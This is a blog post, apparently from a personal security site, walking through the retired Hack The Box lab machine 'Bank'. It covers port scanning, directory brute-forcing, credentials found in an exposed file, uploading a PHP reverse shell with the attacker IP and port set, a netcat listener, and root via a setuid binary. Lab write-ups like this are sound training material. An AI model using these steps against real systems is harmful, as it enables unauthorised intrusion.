<!DOCTYPE html>
<html lang="en">

<head>
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
  
  <meta charset="utf-8">

  <!-- mobile responsive meta -->
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Hack The Box - Bank</title>
  <meta name='description' content='Cyber Security, HackTheBox, Docker, Vmware ESXI and more.'>

  <link rel="canonical" href="https://blckbrdsec.com/2019/12/25/HTB-Bank/">
  <link rel="alternate" type="application/rss+xml" title="Blckbrd Sec – Personal Blog" href="/feed.xml">

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Lora:400,400i,700&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=IBM+Plex+Mono&display=swap" rel="stylesheet">

  <!-- Main Stylesheet -->
  <link href="/assets/css/main.css" rel="stylesheet">
  
  <!-- Icons -->
  <link rel="stylesheet" href="/assets/fonts/icomoon/style.css">

</head>


<body>

  
    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-154457990-1', 'auto');
  ga('send', 'pageview');
</script>
  

  <div class="container-full">
  <!-- begin header -->
  <header class="header">

    <div class="logo">
      <a class="logo__link" href="/">
      
        Blckbrd Sec
      
      </a>
    </div>

    <nav class="main-nav">
      <span class="main-nav__open">menu</span>

      <div class="main-nav__box">
        <span class="main-nav__close">Close</span>

        <ul class="nav__list list-reset">
          <li class="nav__item">
            <a href="/" class="nav__link">Home</a>
          </li>
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
        </ul>

      </div>

    </nav>

  </header>
  <!-- end header -->
</div>


  <!-- begin content -->
  <main class="content" aria-label="Content">
    <div class="container">
  <!-- begin post -->
  <article class="post">
    <div class="post__head" data-aos="fade-up" data-aos-easing="ease-out-quad" data-aos-duration="700">
      <h1 class="post__title">Hack The Box - Bank</h1>
      <div class="post__date">
        <time datetime="2019-12-25T20:55:55+01:00">Published Dec 25, 2019</time>
      </div>
      
      <div class="post-image img-blur" style="background-image: url(/assets/img/bank.png)"></div>
      
    </div>

    <div class="post__content" data-aos="fade-up" data-aos-easing="ease-out-quad" data-aos-delay="100" data-aos-duration="700">
      <p>Write-up for retired machine “Bank” on <a href="https://hackthebox.eu" target="_blank">hackthebox.eu</a>. Its a machine running Linux with IP adress: <strong>10.10.10.29</strong>. Lets start by running a NMAP scan and see what ports are open.</p>

<p><a href="https://www.explainshell.com/explain?cmd=nmap+-T4+-A+-p-+-v+10.10.10.29" target="_blank">nmap -T4 -A -p- -v 10.10.10.29</a></p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-12-25 15:45 EST
NSE: Loaded 151 scripts <span class="k">for </span>scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:45
Completed NSE at 15:45, 0.00s elapsed
Initiating NSE at 15:45
Completed NSE at 15:45, 0.00s elapsed
Initiating NSE at 15:45
Completed NSE at 15:45, 0.00s elapsed
Initiating Ping Scan at 15:45
Scanning 10.10.10.29 <span class="o">[</span>4 ports]
Completed Ping Scan at 15:45, 0.07s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating Parallel DNS resolution of 1 host. at 15:45
Completed Parallel DNS resolution of 1 host. at 15:45, 1.01s elapsed
Initiating SYN Stealth Scan at 15:45
Scanning 10.10.10.29 <span class="o">[</span>65535 ports]
Discovered open port 22/tcp on 10.10.10.29
Discovered open port 53/tcp on 10.10.10.29
Discovered open port 80/tcp on 10.10.10.29
Completed SYN Stealth Scan at 15:45, 14.48s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Initiating Service scan at 15:45
Scanning 3 services on 10.10.10.29
Completed Service scan at 15:46, 6.08s elapsed <span class="o">(</span>3 services on 1 host<span class="o">)</span>
Initiating OS detection <span class="o">(</span>try <span class="c">#1) against 10.10.10.29</span>
Retrying OS detection <span class="o">(</span>try <span class="c">#2) against 10.10.10.29</span>
Retrying OS detection <span class="o">(</span>try <span class="c">#3) against 10.10.10.29</span>
Retrying OS detection <span class="o">(</span>try <span class="c">#4) against 10.10.10.29</span>
Retrying OS detection <span class="o">(</span>try <span class="c">#5) against 10.10.10.29</span>
Initiating Traceroute at 15:46
Completed Traceroute at 15:46, 0.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 15:46
Completed Parallel DNS resolution of 2 hosts. at 15:46, 1.01s elapsed
NSE: Script scanning 10.10.10.29.
Initiating NSE at 15:46
Completed NSE at 15:46, 8.20s elapsed
Initiating NSE at 15:46
Completed NSE at 15:46, 0.10s elapsed
Initiating NSE at 15:46
Completed NSE at 15:46, 0.01s elapsed
Nmap scan report <span class="k">for </span>10.10.10.29
Host is up <span class="o">(</span>0.024s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 <span class="o">(</span>DSA<span class="o">)</span>
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 <span class="o">(</span>RSA<span class="o">)</span>
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works</code></pre></figure>

<p>With the NMAP scan we found de following open ports.</p>
<ul>
  <li>22 SSH</li>
  <li>53 DNS</li>
  <li>80 Apache webserver</li>
</ul>

<p>When we visit 10.10.10.29 in Firefox we get the default Apache webserver page.</p>

<p><img src="/assets/img/apache.png" alt="Apache default page" /></p>

<p>So with some guessing we’re going to use the domain name bank.htb and bind it to 10.10.10.9 in the hosts file.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">127.0.0.1       localhost
127.0.1.1       kali
10.10.10.29     bank.htb</code></pre></figure>

<p>Now when we visit bank.htb we get a login page. At first glance default user and passwords won’t work and nothing useful in de page source  so we have to dig a little deeper.</p>

<p><img src="/assets/img/banklogin.png" alt="bank.htb login page" /></p>

<p>Lets run <a href="https://github.com/maurosoria/dirsearch" target="_blank">dirsearch</a> to see if we can find more directories. 
I used dirbusters medium wordlist for this search.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python3 ./dirsearch.py <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  <span class="nt">-f</span> <span class="nt">-e</span> php <span class="nt">-u</span> http://bank.htb <span class="nt">-t</span> 20

 _|. _ _  _  _  _ _|_    v0.3.9                                                                                                                                                
<span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>                                                                                                                                                         
                                                                                                                                                                               
Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041

Target: http://bank.htb                                                                                                                                                        
                                                                                                                                                                               
<span class="o">[</span>05:29:19] Starting: 
<span class="o">[</span>05:29:19] 403 -  279B  - /.php
<span class="o">[</span>05:29:19] 302 -    7KB - /index.php  -&gt;  login.php
<span class="o">[</span>05:29:20] 200 -    2KB - /login.php  
<span class="o">[</span>05:29:20] 302 -    3KB - /support.php  -&gt;  login.php
<span class="o">[</span>05:29:20] 403 -  281B  - /icons/      
<span class="o">[</span>05:29:21] 403 -  283B  - /uploads/    
<span class="o">[</span>05:29:22] 200 -    2KB - /assets/              
<span class="o">[</span>05:29:46] 302 -    0B  - /logout.php  -&gt;  index.php
<span class="o">[</span>05:30:15] 200 -    1KB - /inc/                    
<span class="o">[</span>05:45:48] 403 -  289B  - /server-status/                                                                               
<span class="o">[</span>05:56:50] 200 -  248KB - /balance-transfer/                                                                                                                         
                                                                                                                                               
Task Completed                                   </code></pre></figure>

<p>http://bank.htb/balance-transfer show a number of records with encrypted credentials.</p>

<p><img src="/assets/img/balance.png" alt="balance-transfer" /></p>

<p>Among all the records we see a significant smaller file compared to the rest.</p>

<p><img src="/assets/img/smallfile.png" alt="balance-transfer" /></p>

<p>Opening 68576f20e9732f1b2edc4df5b8533230.acc we see –ERR ENCRYPT FAILED and usable credentials which we will use t login.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nt">--ERR</span> ENCRYPT FAILED
+<span class="o">=================</span>+
| HTB Bank Report |
+<span class="o">=================</span>+

<span class="o">===</span><span class="nv">UserAccount</span><span class="o">===</span>
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: <span class="o">!</span><span class="c">##HTBB4nkP4ssw0rd!##</span>
CreditCards: 5
Transactions: 39
Balance: 8842803 <span class="nb">.</span>
<span class="o">===</span><span class="nv">UserAccount</span><span class="o">===</span></code></pre></figure>

<p><img src="/assets/img/support.png" alt="support" /></p>

<p>On the support page we can upload a malicious php file. I used the php reverse shell by <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank">pentestmonkey</a></p>

<p>Change the ip, port and rename the malicious php file extension to .htb</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.10.10.1'</span><span class="p">;</span>  // CHANGE THIS
<span class="nv">$port</span> <span class="o">=</span> 1234<span class="p">;</span>       // CHANGE THIS</code></pre></figure>

<p>Start a  <strong>nc -nvlp 1234</strong> listener for the reverse shell and now upload the .htb file.</p>

<p><img src="/assets/img/upload.png" alt="upload" /></p>

<p>Open the attachment in the ticket and voila we got a shell.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Linux bank 4.4.0-79-generic <span class="c">#100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux</span>
 23:42:15 up 12:05,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ </span></code></pre></figure>

<p>Since we’re www-data the user.txt can be located in /home/chris.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /home/chris
total 4
<span class="nt">-r--r--r--</span> 1 chris chris 33 May 29  2017 user.txt</code></pre></figure>

<p>To get root we use <a href="https://github.com/rebootuser/LinEnum" target="_blank">LinEnum</a></p>

<p>Use pythons SimpleHTTPServer and wget the LinEnum.sh file to the /var/www/bank dir and run it.</p>

<p>Analysing the report the emergency file stands out from the rest.</p>

<ul>
  <li>-rwsr-xr-x 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency</li>
</ul>

<p>If we run it in nc nothing seems to happen, but <strong>id</strong> now shows <strong>euid=0(root) groups=0(root)</strong>.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /var/htb/bin
<span class="nv">$ </span>./emergency

<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span></code></pre></figure>

<p>So now we can get the root.txt in the /root/ dir and we’re done.</p>

    </div>

    
    <div class="post-tags">
      
      <a href="/tag/hackthebox" class="post-tags__tag">hackthebox</a>
      
      <a href="/tag/bank" class="post-tags__tag">bank</a>
      
      <a href="/tag/linenum" class="post-tags__tag">linenum</a>
      
      <a href="/tag/linux" class="post-tags__tag">linux</a>
      
      <a href="/tag/reverse-shell" class="post-tags__tag">reverse-shell</a>
      
    </div>
    

    <div class="post__share">
      <ul class="share__list list-reset">
        <li class="share__item">
          <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blckbrdsec.com/2019/12/25/HTB-Bank/"
            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow">
              <svg enable-background="new 0 0 56.693 56.693" height="56.693" viewBox="0 0 56.693 56.693" width="56.693" xmlns="http://www.w3.org/2000/svg"><path d="m40.43 21.739h-7.645v-5.014c0-1.883 1.248-2.322 2.127-2.322h5.395v-8.278l-7.43-.029c-8.248 0-10.125 6.174-10.125 10.125v5.518h-4.77v8.53h4.77v24.137h10.033s0-13.32 0-24.137h6.77z"/></svg>
            </a>
        </li>

        <li class="share__item">
          <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=Hack%20The%20Box%20-%20Bank&url=https://blckbrdsec.com/2019/12/25/HTB-Bank/"
            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow">
              <svg enable-background="new 0 0 56.693 56.693" height="56.693" viewBox="0 0 56.693 56.693" width="56.693" xmlns="http://www.w3.org/2000/svg"><path d="m52.837 15.065c-1.811.805-3.76 1.348-5.805 1.591 2.088-1.25 3.689-3.23 4.444-5.592-1.953 1.159-4.115 2-6.418 2.454-1.843-1.964-4.47-3.192-7.377-3.192-5.581 0-10.106 4.525-10.106 10.107 0 .791.089 1.562.262 2.303-8.4-.422-15.848-4.445-20.833-10.56-.87 1.492-1.368 3.228-1.368 5.082 0 3.506 1.784 6.6 4.496 8.412-1.656-.053-3.215-.508-4.578-1.265-.001.042-.001.085-.001.128 0 4.896 3.484 8.98 8.108 9.91-.848.23-1.741.354-2.663.354-.652 0-1.285-.063-1.902-.182 1.287 4.015 5.019 6.938 9.441 7.019-3.459 2.711-7.816 4.327-12.552 4.327-.815 0-1.62-.048-2.411-.142 4.474 2.869 9.786 4.541 15.493 4.541 18.591 0 28.756-15.4 28.756-28.756 0-.438-.009-.875-.028-1.309 1.974-1.422 3.688-3.203 5.042-5.23z"/></svg>
            </a>
        </li>

        <li class="share__item">
          <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=https://blckbrdsec.com/2019/12/25/HTB-Bank/&amp;media=https://blckbrdsec.com/assets/img/bank.png&amp;description=Hack%20The%20Box%20-%20Bank"
            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow">
              <svg enable-background="new 0 0 56.693 56.693" height="56.693" viewBox="0 0 56.693 56.693" width="56.693" xmlns="http://www.w3.org/2000/svg"><path d="m28.348 5.158c-13.599 0-24.625 11.023-24.625 24.625 0 10.082 6.063 18.744 14.739 22.553-.069-1.721-.012-3.783.429-5.654.473-2 3.168-13.418 3.168-13.418s-.787-1.572-.787-3.896c0-3.648 2.115-6.373 4.749-6.373 2.24 0 3.322 1.682 3.322 3.695 0 2.252-1.437 5.619-2.175 8.738-.616 2.613 1.31 4.744 3.887 4.744 4.665 0 7.808-5.992 7.808-13.092 0-5.397-3.635-9.437-10.246-9.437-7.47 0-12.123 5.57-12.123 11.792 0 2.146.633 3.658 1.624 4.83.455.537.519.754.354 1.371-.118.453-.389 1.545-.501 1.977-.164.625-.669.848-1.233.617-3.44-1.404-5.043-5.172-5.043-9.408 0-6.994 5.899-15.382 17.599-15.382 9.4 0 15.588 6.804 15.588 14.107 0 9.658-5.369 16.875-13.285 16.875-2.659 0-5.16-1.438-6.016-3.068 0 0-1.43 5.674-1.732 6.768-.522 1.9-1.545 3.797-2.479 5.275 2.215.654 4.554 1.01 6.979 1.01 13.598 0 24.623-11.023 24.623-24.623-.001-13.603-11.027-24.626-24.624-24.626z"/></svg>
            </a>
        </li>
      </ul>
    </div>

    <div class="post__navigation">
      

      
    </div>

    
      <div class="show-comments">
  <button class="disqus-button" id="show-comments-button" onclick="disqus();return false;">Leave a comment</button>
</div>

<div id="disqus_thread"></div>

<script>
var disqus_loaded = false;
var disqus_shortname = 'blckbrdsec'; // Add your shortname here
function disqus() {
  if (!disqus_loaded)  {
      disqus_loaded = true;
      var e = document.createElement("script");
      e.type = "text/javascript";
      e.async = true;
      e.src = "//" + disqus_shortname + ".disqus.com/embed.js";
      (document.getElementsByTagName("head")[0] ||
      document.getElementsByTagName("body")[0])
      .appendChild(e);
      // Hide the button after opening
      document.getElementById("show-comments-button").style.display = "none";
  }
}
</script>
<noscript>Please enable JavaScript to view the
  <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript>

    

  </article>
  <!-- end post -->
</div>

  </main>
  <!-- end content -->

  <div class="container">
  <!-- begin footer -->
  <footer class="footer">
    <div class="footer__inner">
      <div class="contact">
        <span> 
            <script>document.write(new Date().getFullYear());
            </script> - www.blckbrdsec.com<br><br>
        </span>
        <ul class="contact__list list-reset">
  <li class="contact__item">
    <a href="https://twitter.com/blckbrdsec" class="contact__link" target="_blank" rel="noopener" title="Twitter"><span class="contact__icon icon-twitter"></span></a>
  </li>
  <li class="contact__item">
    <a href="https://github.com/blckbrd" class="contact__link" target="_blank" rel="noopener" title="Github"><span class="contact__icon icon-github"></span></a>
  </li>
</ul>

      </div>
    </div>
  </footer>
  <!-- end footer -->
</div>


  <!-- begin js -->
  <script src="/assets/js/vendors/jquery-3.3.1.min.js"></script>
  <script src="/assets/js/vendors/aos.js"></script>
  <script src="/assets/js/vendors/jquery.fitvids.js"></script>
  <script src="/assets/js/common.js"></script>
  <!-- end js -->
</body>

</html>
